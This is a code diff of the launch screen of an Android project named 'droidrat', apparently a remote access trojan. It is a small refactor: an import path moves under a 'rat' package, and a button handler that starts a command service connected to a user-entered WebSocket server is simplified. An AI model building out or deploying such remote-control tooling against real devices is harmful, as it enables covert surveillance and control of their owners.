@@ -1,7 +1,6 @@
 package com.je_chen.droidrat_je.activity;
 
 import android.Manifest;
-import android.annotation.SuppressLint;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
@@ -14,7 +13,7 @@ import android.widget.ImageView;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.je_chen.droidrat_je.R;
-import com.je_chen.droidrat_je.modules.appsinfo.checkpermission.PermissionsCheck;
+import com.je_chen.droidrat_je.rat.modules.appsinfo.checkpermission.PermissionsCheck;
 import com.je_chen.droidrat_je.service.command.ProcessCommandService;
 
 import java.util.ArrayList;
@@ -23,7 +22,6 @@ import java.util.List;
 
 public class LaunchActivity extends AppCompatActivity implements View.OnClickListener {
 
-    final String TAG = "JE-TAG";
 
     PackageManager packageManager;
 
@@ -92,15 +90,12 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
 
     }
 
-    @SuppressLint("NonConstantResourceId")
     @Override
     public void onClick(View view) {
-        switch (view.getId()) {
-            case R.id.connectButton:
-                Intent startBackgroundService = new Intent(this, ProcessCommandService.class);
-                startBackgroundService.putExtra("URI", webSocketServerText.getText().toString());
-                startService(startBackgroundService);
-                break;
+        if (view.getId() == R.id.connectButton) {
+            Intent startBackgroundService = new Intent(this, ProcessCommandService.class);
+            startBackgroundService.putExtra("URI", webSocketServerText.getText().toString());
+            startService(startBackgroundService);
         }
     }
 }
